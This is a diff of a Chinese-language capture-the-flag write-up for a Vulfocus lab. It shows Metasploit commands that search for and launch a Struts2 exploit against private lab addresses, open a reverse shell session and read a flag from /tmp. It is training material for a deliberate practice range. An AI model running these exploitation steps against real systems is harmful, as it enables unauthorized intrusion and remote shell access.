@@ -51,14 +51,12 @@ db_status
 workspace -a demo
 ```
 ![](./images/安装metaspoloit.png)
-![](./images/初始化数据库.png)
-
 ![好帅的图](./images/启用metaspoilt.png)
 ![](./images/连接到sql并建立工作区.png)
 
 
 
-3. 通过**上帝视角**我们知道我们要攻击的是struts2漏洞，所以直接在metasploit中搜索struts2漏洞，并使用exp进行攻击：
+1. 通过**上帝视角**我们知道我们要攻击的是struts2漏洞，所以直接在metasploit中搜索struts2漏洞，并使用exp进行攻击：
 ```bash
 search struts2 # 搜索struts2漏洞
 ## 查找出来后可用info查看信息
@@ -86,18 +84,18 @@ show options
 set RHOSTS 192.168.70.4
 set rport <your_port>
 set LHOST 192.168.70.7
+exploit -j
 ```
 ![](./images/使用options去查看payload的参数.png)
 ![](./images/指定lhost.png)
 ![](./images/根据option修改host和port.png)
 
-* 这时exp参数已经设置完毕了，我们直接使用```exploit -j```进行攻击
+
 ![](./images/开始攻击第一个靶机看到1session%20open，攻击成功.png)
 **看到 shell seeion1 open，攻击成功**
 * 这时我们用```seeions -l``` 查看一下session, 并且使用```sessions -i 1```进入session
-**在/tem 目录下执行ls -la，可以看到flag**
+**在/tem 目录下执行ls -la，可以看到flag,提交到vulfocus中就可以了**
 ![](./images/利用第一个靶机的反弹shell拿到第一个flag.png)
-* 提交到vulfocus中就可以了
 ![](./images/第一个flag提交完毕.png)
 ### 立足第一个靶机发现第二到四个靶标
 **由于我们拿到了第一个反弹shell，在metasploit中我们可以升级这个shell**
